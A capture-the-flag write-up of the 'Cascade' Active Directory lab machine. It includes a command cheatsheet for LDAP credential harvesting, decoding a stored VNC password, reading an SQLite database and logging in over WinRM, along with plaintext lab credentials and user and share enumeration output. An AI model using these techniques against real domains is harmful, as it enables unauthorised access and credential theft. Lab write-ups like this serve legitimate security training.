# Cascade \[Medium]

## Report

{% embed url="https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html" %}

ldapsearch reveals creds for user 'r.thompson'  who has access to SMB shares where four files mentioned in the cheatsheet are of interest. The VNC install was found in the directory of 's.smith' which contians a registry exposing a password in hex. Decrypt to get creds.

User is part of the group 'Audit Share' which has a comment pointing towards the SMB share audit which is inaccessible locally. Find a db and exe file, the db however has encypted creds for 'ArkSvc', debug using dnSPY to get creds.

This user is part of the AD Recycle Bin manager and we finally use the hint we saw at the start from the arkadrecyclebin.log file where TempAdmin has the same creds as Admin. Showing deleted objects exposes creds for Admin&#x20;

## Cheatsheet

```
ldapsearch -H ldap://10.10.10.182 -x -b "DC=cascade,DC=local" '(objectClass=Person)' | grep cascadeLegacyPwd

[email.html] Username is TempAdmin (password is the same as the normal admin account password)
[dcdiag.log] The WinRM service failed to create the following SPNs: WSMAN/CASC-DC1.cascade.local; WSMAN/CASC-DC1
[vncinstall.reg] "Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
[arkadrecyclebin.log] Users test and TempAdmin have been moved to AD recycle bin
tightvnc - rdp software

echo -n 6bcf2a4b6e5aca0f | xxd -r -p > passwd

s.smith - the recycle bin shi didnt work but its part of a new group Audit Users
net localgroup "Audit Share"
Comment        \\Casc-DC1\Audit$
C:\Shares not accessible, however it is via SMB

.tables
.schema tablename
SELECT * FROM tablename;

FInd an exe and db file Audit.db -> dnSPY to debug at breakpoint and see plaintext password OR check encryption function, hardcoded IV and key and reveng
nxc winrm 10.10.10.182 -u 'ArkSvc' -p 'w3lc0meFr31nd'
```

## Loot

### Creds

```
r.thompson:rY4n5eva (from ldapsearch)
s.smith:sT333ve2 (crack the rdp encrypted password)
ArkSvc:w3lc0meFr31nd (debug exe file)
```



```
CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local)

user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]

SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit$                          
SMB         10.10.10.182    445    CASC-DC1         C$                              Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ            
SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share 
```

### Proof

<figure><img src="../../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
